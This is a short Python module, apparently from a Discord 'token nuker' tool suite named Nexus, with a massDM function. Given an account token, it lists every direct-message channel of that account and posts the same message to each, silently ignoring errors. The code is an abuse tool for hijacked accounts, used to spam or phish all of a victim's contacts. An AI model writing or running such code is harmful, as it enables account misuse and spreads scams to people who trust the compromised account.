from Helper import *
from Helper.Common.utils import *
from Helper.Plugs.TokenNukerPlugs import *

def massDM(token, content):
    new_title("Nexus Mass Dm")
    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            headers=headers,
            data={"content": f"{content}"})
            print(f"{lc} {Fore.BLUE}Id={Fore.WHITE}{id}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}SEND{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        except Exception as e:
            print(f"{lc} The following error has been encountered and is being ignored: {e}")